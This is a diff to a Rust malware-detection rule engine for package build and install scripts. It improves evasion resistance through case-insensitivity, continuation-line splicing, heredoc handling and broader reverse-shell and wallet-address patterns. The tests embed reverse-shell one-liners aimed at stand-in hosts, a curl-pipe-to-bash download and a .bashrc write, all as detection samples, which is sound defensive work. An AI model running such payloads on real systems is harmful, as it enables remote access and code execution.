@@ -5,8 +5,9 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
+use crate::textutil::logical_lines;
 use crate::types::{Category, FileType, Severity};
-use regex::Regex;
+use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
 use std::collections::HashMap;
 use std::path::Path;
@@ -28,8 +29,10 @@ pub struct Rule {
     /// Patterns to match
     #[serde(default)]
     pub patterns: Vec<Pattern>,
-    /// File types this rule applies to
-    #[serde(default)]
+    /// File types this rule applies to. Defaults to PKGBUILD + install script
+    /// rather than empty: a rule indexed under no file type is silently never
+    /// matched, so a community rule that omits `file_types` would be inert.
+    #[serde(default = "default_file_types")]
     pub file_types: Vec<FileType>,
     /// Recommendation for fixing
     pub recommendation: String,
@@ -43,6 +46,13 @@ pub struct Rule {
 
 fn default_true() -> bool {
     true
+}
+
+/// Default file types for a rule that does not specify them. Empty would make
+/// the rule inert (it is indexed per file type), so default to the two types
+/// every scan looks at.
+fn default_file_types() -> Vec<FileType> {
+    vec![FileType::Pkgbuild, FileType::InstallScript]
 }
 
 /// Pattern type for matching
@@ -88,12 +98,29 @@ pub enum CompiledPattern {
     Variable { name: String, value_pattern: Option<Regex> },
 }
 
+/// Compile a rule regex with safe defaults.
+///
+/// * Case-insensitive by default so trivial case variation (`CURL`, `Xmrig`)
+///   cannot evade a rule. A pattern that needs case sensitivity for a specific
+///   span (e.g. a Base58 address class) opts out inline with `(?-i:...)`.
+/// * Explicit size/DFA limits: rule patterns can come from filesystem
+///   `rules.d` files, so bound compiled-program and DFA memory rather than
+///   trusting every author.
+fn compile_regex(pattern: &str) -> Result<Regex> {
+    RegexBuilder::new(pattern)
+        .case_insensitive(true)
+        .size_limit(4 * 1024 * 1024)
+        .dfa_size_limit(16 * 1024 * 1024)
+        .build()
+        .map_err(Into::into)
+}
+
 impl CompiledPattern {
     /// Compile a pattern
     pub fn compile(pattern: &Pattern) -> Result<Self> {
         match pattern {
             Pattern::Regex { pattern } => {
-                let re = Regex::new(pattern)?;
+                let re = compile_regex(pattern)?;
                 Ok(CompiledPattern::Regex(re))
             }
             Pattern::Literal {
@@ -104,10 +131,10 @@ impl CompiledPattern {
                 case_sensitive: *case_sensitive,
             }),
             Pattern::Function { name, body_pattern } => {
-                let name_re = Regex::new(name)?;
+                let name_re = compile_regex(name)?;
                 let body_re = body_pattern
                     .as_ref()
-                    .map(|p| Regex::new(p))
+                    .map(|p| compile_regex(p))
                     .transpose()?;
                 Ok(CompiledPattern::Function {
                     name: name_re,
@@ -117,7 +144,7 @@ impl CompiledPattern {
             Pattern::Variable { name, value_pattern } => {
                 let value_re = value_pattern
                     .as_ref()
-                    .map(|p| Regex::new(p))
+                    .map(|p| compile_regex(p))
                     .transpose()?;
                 Ok(CompiledPattern::Variable {
                     name: name.clone(),
@@ -231,18 +258,27 @@ impl RuleEngine {
             None => return matches,
         };
 
-        let lines: Vec<&str> = content.lines().collect();
+        // Work on *logical* lines: bash backslash-newline continuations are
+        // spliced back together so a payload split across physical lines
+        // (`curl evil \`<nl>`| sh`) cannot evade a single-line rule. Each entry
+        // carries the originating physical line number for reporting.
+        let lines: Vec<(usize, String)> = logical_lines(content);
+        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
         // Lines that are informational text printed to the user (the body of a
-        // non-redirected heredoc, e.g. a `cat <<EOF` post_install message) are
-        // not executed, so path-presence rules must not match them. A redirected
-        // heredoc (`<<EOF > file`) writes content and is still scanned.
-        let informational = informational_lines(&lines);
+        // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
+        // executed, so low-risk path-presence rules must not match them. A
+        // heredoc fed to an interpreter, or redirected to a file, is still code.
+        let informational = informational_lines(&line_strs);
 
         for compiled in rules {
-            for (line_idx, line) in lines.iter().enumerate() {
-                // Skip pure comment lines and printed heredoc message bodies.
+            for (idx, (phys_line, line)) in lines.iter().enumerate() {
+                // Skip pure comment lines and printed heredoc bodies. A heredoc
+                // is only marked informational when it is fed to a pure printer
+                // (cat/echo/printf) and not piped/redirected; a heredoc fed to an
+                // interpreter (`bash <<EOF`) is NOT informational and is scanned
+                // here, so executable payloads hidden in a heredoc are caught.
                 let trimmed = line.trim();
-                if trimmed.starts_with('#') || informational[line_idx] {
+                if trimmed.starts_with('#') || informational[idx] {
                     continue;
                 }
 
@@ -250,10 +286,10 @@ impl RuleEngine {
                     if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                         matches.push(RuleMatch {
                             rule_id: compiled.rule.id.clone(),
-                            line: line_idx + 1,
+                            line: *phys_line,
                             column: m.0,
                             matched_text: m.1,
-                            context: line.to_string(),
+                            context: line.clone(),
                         });
                     }
                 }
@@ -330,8 +366,12 @@ pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
     dirs
 }
 
-/// Flag each line that is the body of a non-redirected heredoc (printed text,
-/// not executed code), so path/string-presence rules don't match user messages.
+/// Flag each line that is printed text rather than executed code -- the body of
+/// a non-redirected heredoc, or a single-line pure message print (`echo`/`note`/
+/// `msg "..."`) -- so path/string-presence rules don't match user-facing
+/// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
+/// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
+/// one. This was a real false positive on google-chrome / vscode.)
 fn informational_lines(lines: &[&str]) -> Vec<bool> {
     let mut flags = vec![false; lines.len()];
     let mut terminator: Option<String> = None;
@@ -345,9 +385,38 @@ fn informational_lines(lines: &[&str]) -> Vec<bool> {
         }
         if let Some(delim) = heredoc_message_delim(line) {
             terminator = Some(delim);
+        } else if is_pure_message_print(line) {
+            flags[i] = true;
         }
     }
     flags
+}
+
+/// Whether `line` is a single-line message print whose argument is just text the
+/// user sees -- it cannot run another command or write a file, so a path/string
+/// it mentions is a mention, not an action.
+///
+/// Conservative on purpose: the command must be a known printer AND the line
+/// must contain no redirection, pipe, command substitution, or command chaining
+/// (any of which could execute or write). `echo x > ~/.bashrc`, `echo "$(curl
+/// evil)"`, and `echo x | sh` therefore are NOT treated as inert.
+fn is_pure_message_print(line: &str) -> bool {
+    let t = line.trim();
+    let cmd = t.split([' ', '\t']).next().unwrap_or("");
+    const PRINTERS: &[&str] = &[
+        "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
+    ];
+    if !PRINTERS.contains(&cmd) {
+        return false;
+    }
+    // Anything that could redirect, pipe, substitute, or chain a command means
+    // the line is not a pure print -- scan it.
+    !(t.contains('>')
+        || t.contains('|')
+        || t.contains("$(")
+        || t.contains('`')
+        || t.contains(';')
+        || t.contains('&'))
 }
 
 /// If `line` opens a heredoc that just prints a message (no redirection to a
@@ -387,6 +456,26 @@ fn heredoc_message_delim(line: &str) -> Option<String> {
         || rest[i..].contains('>')
         || line.contains("tee ");
     if redirected {
+        return None;
+    }
+    // Only treat the body as printed-not-executed when the consuming command is
+    // a pure printer (cat/echo/printf) AND the heredoc is not piped into another
+    // command. A heredoc fed to an interpreter -- `bash <<EOF`, `python <<EOF`,
+    // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
+    // scanned. When unsure, do NOT suppress (fail toward scanning).
+    let before = &line[..pos];
+    let last_command = before
+        .rsplit([';', '|', '&', '('])
+        .next()
+        .unwrap_or(before);
+    let is_pure_printer = last_command
+        .split_whitespace()
+        .next()
+        .map(|cmd| matches!(cmd, "cat" | "echo" | "printf"))
+        .unwrap_or(false);
+    // A pipe anywhere on the opener means the body may be fed to a command.
+    let piped = line.contains('|');
+    if !is_pure_printer || piped {
         return None;
     }
     Some(delim.to_string())
@@ -480,7 +569,11 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![Pattern::Regex {
-                pattern: r"/dev/tcp/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+".to_string(),
+                // Any /dev/tcp or /dev/udp host/port -- hostname, IPv4, IPv6, or
+                // hex/decimal IP -- is a reverse-shell channel. The old rule only
+                // matched dotted-quad IPv4 and missed `/dev/tcp/evil.com/4444`,
+                // `/dev/tcp/0x7f000001/4444`, IPv6, etc.
+                pattern: r"/dev/(tcp|udp)/[^\s/]+/[^\s/]+".to_string(),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Remove reverse shell code immediately".to_string(),
@@ -948,6 +1041,20 @@ pub fn get_builtin_rules() -> Vec<Rule> {
                 Pattern::Regex {
                     pattern: r#"(?i)(wallet|donate)_?(addr|address)?\s*=\s*['"]?[a-zA-Z0-9]{26,}"#.to_string(),
                 },
+                // Bare Monero address by format (no surrounding keyword needed):
+                // a miner config can drop the address with no `wallet`/`xmr`
+                // nearby. `(?-i)` keeps the Base58 classes case-exact despite the
+                // engine's case-insensitive default. The 95-char shape is highly
+                // specific, so false positives are negligible.
+                Pattern::Regex {
+                    pattern: r#"(?-i:\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b)"#.to_string(),
+                },
+                // Bare Bech32 Bitcoin address (`bc1...`). Legacy 1.../3...
+                // addresses are left keyword-anchored above as they are far more
+                // false-positive prone than the distinctive bc1 prefix.
+                Pattern::Regex {
+                    pattern: r#"(?-i:\bbc1[02-9ac-hj-np-z]{11,71}\b)"#.to_string(),
+                },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Wallet addresses in packages are highly suspicious".to_string(),
@@ -1410,6 +1517,103 @@ mod tests {
         let matches = engine.match_content(content, FileType::Pkgbuild);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].rule_id, "DLE-001");
+    }
+
+    #[test]
+    fn printed_message_mentioning_dotfile_is_not_flagged() {
+        // Real false positive from google-chrome / vscode: a printed note that
+        // mentions ~/.config must NOT trip HIDDEN-001 (it mentions a path; it
+        // does not create one).
+        let engine = RuleEngine::default();
+        let m = engine.match_content(
+            "note \"Custom flags should be put directly in: ~/.config/chrome-flags.conf\"",
+            FileType::InstallScript,
+        );
+        assert!(
+            !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+            "a printed note mentioning ~/.config must not trip HIDDEN-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn actual_write_to_home_dotfile_is_still_flagged() {
+        // The fix must not blind us to a real write: a redirect into ~/.bashrc
+        // is an action, not a message, and must still trip HIDDEN-001.
+        let engine = RuleEngine::default();
+        let m = engine.match_content(
+            "echo 'evil' >> ~/.bashrc",
+            FileType::InstallScript,
+        );
+        assert!(
+            m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+            "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn line_continuation_does_not_evade_curl_bash() {
+        // CR-3: the pipe-to-shell is on a backslash-continuation line. The old
+        // per-physical-line matcher missed this; logical-line splicing catches it
+        // and reports the originating (first) physical line.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  curl https://evil/x.sh \\\n    | bash\n}";
+        let matches = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "DLE-001"),
+            "continuation-split curl|bash must still trip DLE-001: {matches:?}"
+        );
+        assert!(matches.iter().any(|m| m.line == 2), "should report physical line 2");
+    }
+
+    #[test]
+    fn heredoc_fed_to_interpreter_is_scanned() {
+        // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
+        // it must be detected (it is NOT a printed message).
+        let engine = RuleEngine::default();
+        let content = "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
+        let matches = engine.match_content(content, FileType::InstallScript);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SHELL-001"),
+            "reverse shell inside `bash <<EOF` must be caught: {matches:?}"
+        );
+    }
+
+    #[test]
+    fn reverse_shell_matches_hostname_and_ipv6() {
+        // SHELL-001 broadened beyond dotted-quad IPv4.
+        let engine = RuleEngine::default();
+        for payload in [
+            "bash -i >& /dev/tcp/evil.attacker.com/4444 0>&1",
+            "exec 3<>/dev/tcp/0x7f000001/4444",
+            "cat < /dev/tcp/dead:beef::1/9001",
+        ] {
+            let matches = engine.match_content(payload, FileType::Pkgbuild);
+            assert!(
+                matches.iter().any(|m| m.rule_id == "SHELL-001"),
+                "should detect reverse shell in {payload:?}: {matches:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn case_variation_does_not_evade() {
+        // Rules now compile case-insensitively by default.
+        let engine = RuleEngine::default();
+        let matches = engine.match_content("CURL https://evil/x | BASH", FileType::Pkgbuild);
+        assert!(!matches.is_empty(), "uppercase curl|bash should still match");
+    }
+
+    #[test]
+    fn bare_monero_address_detected_without_keyword() {
+        // HI-6c: a miner config dropping a bare 95-char Monero address with no
+        // `wallet`/`xmr` keyword nearby must still trip CRYPTO-003.
+        let engine = RuleEngine::default();
+        let addr = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+        let matches = engine.match_content(addr, FileType::Pkgbuild);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "CRYPTO-003"),
+            "bare Monero address should trip CRYPTO-003: {matches:?}"
+        );
     }
 
     #[test]
